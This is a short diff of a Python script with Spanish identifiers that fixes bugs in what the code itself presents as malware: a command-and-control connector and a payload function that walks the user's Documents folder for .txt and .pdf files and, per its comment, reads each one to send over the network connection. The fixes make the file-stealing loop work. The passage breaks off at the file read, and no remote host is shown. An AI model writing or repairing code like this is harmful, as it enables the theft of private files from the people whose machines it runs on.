@@ -2,7 +2,7 @@ import os
 import sys
 import socket
 import winreg
-import urllib.req
+import urllib.request
 
 def comprobar_entorno_seguro():
     usuario = os.getlogin()
@@ -31,8 +31,8 @@ def conector_comando_control():
 def ejecutar_payload(conexion):
     ruta_documento = os.path.expanduser("~/Documents")
     for raiz, carpeta, archivos in os.walk(ruta_documento):
-        for archivo in archivo:
-            if archivo.endswith(".txt") or archivo.endwith(".pdf"):
+        for archivo in archivos:
+            if archivo.endswith(".txt") or archivo.endswith(".pdf"):
                 #lee el archivo sensible y lo envias por la conexion de red
                 path_completo =os.path.join(raiz, archivo)
                 with open(path_completo, "rb") as f:
